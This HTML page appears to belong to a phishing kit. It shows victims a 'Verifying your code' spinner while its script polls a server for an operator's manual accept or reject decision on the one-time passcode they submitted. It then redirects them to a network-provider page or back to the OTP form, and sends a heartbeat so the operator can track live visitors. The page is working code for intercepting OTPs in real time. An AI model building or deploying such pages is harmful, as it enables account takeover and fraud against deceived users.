<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');

  *{box-sizing:border-box;}
  body{
    margin:0;
    font-family:'Poppins', sans-serif;
    display:flex;
    justify-content:center;
  }

  .phone{
    width:100%;
    max-width:430px;
    min-height:100vh;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    gap:20px;
    background:linear-gradient(160deg, #6b2b0e 0%, #a8420f 30%, #d97a1f 65%, #e2861f 100%);
  }

  .spinner{
    width:52px;
    height:52px;
    border:5px solid rgba(255,255,255,0.35);
    border-top-color:#ffffff;
    border-radius:50%;
    animation:spin 0.8s linear infinite;
  }

  @keyframes spin{
    to{ transform:rotate(360deg); }
  }

  .loading-text{
    color:#ffffff;
    font-size:16px;
    font-weight:700;
    margin:0;
  }
</style>
</head>
<body>

<div class="phone">
  <div class="spinner"></div>
  <p class="loading-text">Verifying your code...</p>
</div>

<script>
// Poll the server for the admin's decision on this OTP request
const pollInterval = setInterval(function(){
  fetch('/api/otp-status')
    .then(function(r){ return r.json(); })
    .then(function(data){
      if(!data) return;

      if(data.status === 'accepted'){
        clearInterval(pollInterval);
        fetch('/api/otp-clear', { method: 'POST' })
          .finally(function(){ window.location.href = 'network-provider.html'; });
      } else if(data.status === 'rejected'){
        clearInterval(pollInterval);
        fetch('/api/otp-clear', { method: 'POST' })
          .finally(function(){ window.location.href = 'otp.html?error=1'; });
      }
    })
    .catch(function(){ /* server still starting up or connection issue */ });
}, 600);

// ---- Real active-visits heartbeat ----
(function(){
  let sid = sessionStorage.getItem('visitSessionId');
  if(!sid){
    sid = 'sid-' + Math.random().toString(36).slice(2) + Date.now();
    sessionStorage.setItem('visitSessionId', sid);
  }
  function sendHeartbeat(){
    fetch('/api/heartbeat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: sid })
    }).catch(function(){});
  }
  sendHeartbeat();
  setInterval(sendHeartbeat, 4000);
})();
</script>

</body>
</html>
